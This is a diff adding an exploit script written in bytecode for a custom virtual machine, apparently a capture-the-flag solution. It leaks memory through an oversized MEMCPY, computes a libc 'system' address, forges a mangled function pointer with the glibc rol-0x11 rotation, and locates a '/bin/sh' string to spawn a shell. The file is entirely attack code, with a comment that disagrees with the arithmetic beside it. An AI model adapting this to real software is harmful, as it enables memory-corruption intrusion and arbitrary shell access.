@@ -1,0 +1,152 @@
+%include "vm.inc"
+
+PUSH_IMM 255
+POP_REG 0
+PUSH_IMM 200
+POP_REG 1
+MEMCPY 1, 0, 0xa0
+
+POP_REG 0
+POP_REG 0
+POP_REG 0
+POP_REG 0
+POP_REG 0
+POP_REG 0
+POP_REG 7
+
+POP_REG 6
+POP_REG 6
+POP_REG 6
+POP_REG 6
+POP_REG 6
+POP_REG 6
+POP_REG 6
+POP_REG 6
+POP_REG 6
+POP_REG 6
+POP_REG 6
+
+
+
+PUSH_IMM 0x15
+POP_REG 0
+
+PUSH_IMM 8
+POP_REG 1
+
+SHL 0, 1
+
+PUSH_IMM 0x00
+POP_REG 1
+ADD 0, 1
+
+ADD 0, 6
+MOV_REG_REG 6, 0
+
+; initial address in reg6
+
+
+
+PUSH_IMM 0x19
+POP_REG 0
+
+PUSH_IMM 8
+POP_REG 1
+
+SHL 0, 1
+
+
+PUSH_IMM 0x4c
+POP_REG 2
+ADD 0, 2
+
+SHL 0, 1
+
+
+PUSH_IMM 0x20
+POP_REG 2
+ADD 0, 2
+
+
+
+MOV_REG_REG 5, 6
+SUB 5, 0
+
+
+; system address in reg5
+
+
+PUSH_IMM 0x19
+POP_REG 0
+
+PUSH_IMM 8
+POP_REG 1
+
+SHL 0, 1
+
+
+PUSH_IMM 0x4c
+POP_REG 2
+ADD 0, 2
+
+SHL 0, 1
+
+
+PUSH_IMM 0x20
+POP_REG 2
+ADD 0, 2
+
+MOV_REG_REG 5, 6
+SUB 5, 0
+
+
+; do   rol, 0x11
+; (reg << 17) | (reg >> 47)
+
+MOV_REG_REG 4, 5
+
+PUSH_IMM 0x11
+POP_REG 0
+
+SHL 5, 0
+
+
+PUSH_IMM 0x2f
+POP_REG 0
+
+SHR 4, 0
+
+OR 5,4
+
+
+
+; /bin/sh = reg6+0x390fc
+
+
+PUSH_IMM 0x3
+POP_REG 0
+
+PUSH_IMM 8
+POP_REG 1
+
+SHL 0, 1
+
+
+PUSH_IMM 0x90
+POP_REG 2
+ADD 0, 2
+
+SHL 0, 1
+
+
+PUSH_IMM 0xfc
+POP_REG 2
+ADD 0, 2
+
+
+
+MOV_REG_REG 4, 6
+SUB 4, 0
+
+
+EXPAND
